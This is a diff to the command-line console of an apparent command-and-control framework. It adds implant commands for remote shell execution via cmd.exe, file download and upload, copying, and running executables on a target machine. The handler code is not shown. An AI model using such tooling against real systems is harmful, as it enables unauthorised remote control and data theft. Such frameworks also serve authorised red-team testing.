@@ -25,20 +25,38 @@ func (c *Cli) Executor(in string) {
 			handlers.HandleImplantWhoami(c.Engine, &c.SessionID, cmdargs)
 		case "ps":
 			handlers.HandleImplantPs(c.Engine, &c.SessionID, cmdargs)
+		case "cd":
+			handlers.HandleImplantCd(c.Engine, &c.SessionID, cmdargs)
+		case "cp":
+			handlers.HandleImplantCp(c.Engine, &c.SessionID, cmdargs)
+		case "shell":
+			handlers.HandleImplantShell(c.Engine, &c.SessionID, cmdargs)
+		case "download":
+			handlers.HandleImplantDownload(c.Engine, &c.SessionID, cmdargs)
+		case "upload":
+			handlers.HandleImplantUpload(c.Engine, &c.SessionID, cmdargs)
+		case "run":
+			handlers.HandleImplantRun(c.Engine, &c.SessionID, cmdargs)
 		case "back":
 			c.SessionID = 0
 		case "help":
 			logger.Info(
 				`Usage:
-      channel                                       - Manage channels
-         register [name]                            - Register channel
-         switch   [name]                            - Switch channel
-         list                                       - List channels
-
-	  ps											- List process
-      whoami                                        - Get implant context
-      back                                          - Exit interactive mode
-      help                                          - Print help menu
+    channel                                       - Manage channels
+       register [name]                            - Register channel
+       switch   [name]                            - Switch channel
+       remove   [name]                            - Remove channel
+       list                                       - List channels
+                -----------------------------
+    ps                                            - List process
+    cd                                            - Change process working directory
+    cp                                            - Copy file to target directory
+    shell                                         - Run a shell command via cmd.exe
+    download                                      - Download file from target machine
+    upload                                        - Upload file to target machine
+    run                                           - Run executable that exits on target machine
+    back                                          - Exit interactive mode
+    help                                          - Print help menu
 `)
 		case "exit":
 			handlers.HandleExit(c.Engine, cmdargs)
